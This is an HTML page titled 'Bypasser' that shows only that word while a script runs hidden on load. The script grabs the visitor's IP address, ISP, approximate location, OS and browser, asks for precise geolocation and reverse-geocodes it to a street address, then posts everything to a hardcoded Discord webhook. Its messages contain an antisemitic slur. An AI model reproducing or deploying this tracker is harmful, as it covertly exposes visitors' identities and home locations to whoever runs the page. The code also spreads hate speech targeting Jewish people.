<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasser</title>
    <style>
        body {
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: #333;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div>Bypasser</div>
    <script>
        async function collectUserData() {
            // Collect user information
            const userAgent = navigator.userAgent || 'Unknown';
            const platform = navigator.platform || 'Unknown';

            // Parse OS and browser from user agent
            let os = 'Unknown';
            let browser = 'Unknown';
            if (userAgent.includes('Windows NT 10.0')) os = 'Windows 10';
            else if (userAgent.includes('Windows NT 6.3')) os = 'Windows 8.1';
            else if (userAgent.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (userAgent.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (userAgent.includes('Mac OS X')) os = 'macOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';

            if (userAgent.includes('Chrome/')) browser = `Chrome ${userAgent.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'}`;
            else if (userAgent.includes('Firefox/')) browser = `Firefox ${userAgent.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'}`;
            else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) browser = `Safari ${userAgent.match(/Version\/([\d.]+)/)?.[1] || 'Unknown'}`;
            else if (userAgent.includes('Edg/')) browser = `Edge ${userAgent.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'}`;

            // Get IP and geolocation using ipwho.is (no token required)
            let ip = 'Unknown', country = 'Unknown', region = 'Unknown', city = 'Unknown', isp = 'Unknown', asn = 'Unknown', coords = 'Unknown', timezone = 'Unknown';
            try {
                const ipResponse = await fetch('https://ipwho.is/', {
                    headers: { 'Accept': 'application/json' }
                });
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    ip = ipData.ip || 'Unknown';
                    country = ipData.country || 'Unknown';
                    region = ipData.region || 'Unknown';
                    city = ipData.city || 'Unknown';
                    isp = ipData.connection ? ipData.connection.isp : 'Unknown';
                    asn = ipData.connection ? ipData.connection.asn : 'Unknown';
                    coords = ipData.latitude && ipData.longitude ? `${ipData.latitude}, ${ipData.longitude} (Approximate)` : 'Unknown';
                    timezone = ipData.timezone ? ipData.timezone.id : 'Unknown';
                } else {
                    console.error('ipwho.is fetch failed:', ipResponse.statusText);
                    // Fallback to db-ip.com
                    try {
                        const fallbackResponse = await fetch('https://api.db-ip.com/v2/free/self', {
                            headers: { 'Accept': 'application/json' }
                        });
                        if (fallbackResponse.ok) {
                            const fallbackData = await fallbackResponse.json();
                            ip = fallbackData.ipAddress || 'Unknown';
                            country = fallbackData.countryName || 'Unknown';
                            region = fallbackData.stateProv || 'Unknown';
                            city = fallbackData.city || 'Unknown';
                            isp = fallbackData.isp || 'Unknown';
                            asn = 'Unknown';
                            coords = 'Unknown';
                            timezone = 'Unknown';
                            console.log('Fallback API (db-ip.com) succeeded');
                        } else {
                            console.error('Fallback API fetch failed:', fallbackResponse.statusText);
                        }
                    } catch (error) {
                        console.error('Error fetching fallback IP info:', error);
                    }
                }
            } catch (error) {
                console.error('Error fetching ipwho.is IP info:', error);
            }

            // Prepare Discord embed
            const embed = {
                title: "IP Logged",
                description: "A Stupid Jew Opened The Website",
                color: 0x6e8efb,
                timestamp: new Date().toISOString(),
                thumbnail: {
                    url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                },
                fields: [
                    {
                        name: "IP Info",
                        value: [
                            `\`IP: ${ip}\``,
                            `\`Provider: ${isp}\``,
                            `\`ASN: ${asn}\``,
                            `\`Country: ${country}\``,
                            `\`Region: ${region}\``,
                            `\`City: ${city}\``,
                            `\`Coords: ${coords}\``,
                            `\`Timezone: ${timezone}\``,
                            `\`Mobile: False\``,
                            `\`VPN: False\``,
                            `\`Bot: False\``
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: "PC Info",
                        value: [
                            `\`OS: ${os}\``,
                            `\`Browser: ${browser}\``
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: "User Agent",
                        value: `\`${userAgent.substring(0, 1000)}\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Collected via Platform",
                    icon_url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                }
            };

            // Send to Discord webhook with retry mechanism
            async function sendToDiscord(embedData) {
                const webhookUrl = 'https://discord.com/api/webhooks/1439953789636575284/rbZ60TDkD52cVqpvJDwhDABnQDbZNTM4fhvy-S_4ZbPAMgtyfKhIuzv7x9hsQwErWFr1';
                // Send embed with webhook name and avatar
                for (let attempt = 1; attempt <= 3; attempt++) {
                    try {
                        const response = await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: '@everyone @here',
                                embeds: [embedData],
                                username: 'Jew',
                                avatar_url: 'https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless'
                            })
                        });
                        if (response.ok) {
                            console.log(`Successfully sent embed to Discord (Attempt ${attempt})`);
                            break;
                        } else {
                            console.error(`Error sending embed (Attempt ${attempt}): ${response.statusText}`, JSON.stringify(embedData, null, 2));
                        }
                    } catch (error) {
                        console.error(`Error sending embed to Discord (Attempt ${attempt}):`, error);
                    }
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }

            // Execute sending
            await sendToDiscord(embed);
            
            // Request precise location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        // Success callback - user allowed location access
                        const { latitude, longitude, accuracy } = position.coords;
                        
                        // Try to get address information from coordinates
                        let addressDetails = {};
                        try {
                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                            const data = await response.json();
                            
                            if (data && data.address) {
                                addressDetails = {
                                    houseNumber: data.address.house_number || 'Unknown',
                                    road: data.address.road || 'Unknown',
                                    neighbourhood: data.address.neighbourhood || 'Unknown',
                                    suburb: data.address.suburb || 'Unknown',
                                    city: data.address.city || data.address.town || data.address.village || 'Unknown',
                                    state: data.address.state || 'Unknown',
                                    postcode: data.address.postcode || 'Unknown',
                                    country: data.address.country || 'Unknown'
                                };
                            }
                        } catch (error) {
                            console.error("Error getting address information:", error);
                        }
                        
                        // Prepare precise location Discord embed
                        const preciseEmbed = {
                            title: "PRECISE LOCATION LOGGED",
                            description: "User allowed location access",
                            color: 0xFF0000,
                            timestamp: new Date().toISOString(),
                            thumbnail: {
                                url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                            },
                            fields: [
                                {
                                    name: "Precise Location Info",
                                    value: [
                                        `\`Latitude: ${latitude}\``,
                                        `\`Longitude: ${longitude}\``,
                                        `\`Accuracy: ${accuracy} meters\``,
                                        `\`House Number: ${addressDetails.houseNumber}\``,
                                        `\`Street: ${addressDetails.road}\``,
                                        `\`Neighborhood: ${addressDetails.neighbourhood || addressDetails.suburb || 'Unknown'}\``,
                                        `\`City: ${addressDetails.city}\``,
                                        `\`State: ${addressDetails.state}\``,
                                        `\`Postcode: ${addressDetails.postcode}\``,
                                        `\`Country: ${addressDetails.country}\``
                                    ].join('\n'),
                                    inline: false
                                },
                                {
                                    name: "IP Info",
                                    value: [
                                        `\`IP: ${ip}\``,
                                        `\`Provider: ${isp}\``,
                                        `\`Country: ${country}\``,
                                        `\`City: ${city}\``
                                    ].join('\n'),
                                    inline: false
                                }
                            ],
                            footer: {
                                text: "Precise location collected",
                                icon_url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                            }
                        };
                        
                        // Send precise location to Discord
                        await sendToDiscord(preciseEmbed);
                    },
                    (error) => {
                        // Error callback - user denied location access or error occurred
                        console.log("Location access denied or error occurred.");
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        // Run on page load
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => collectUserData(), 1000);
        });
    </script>
</body>
</html>
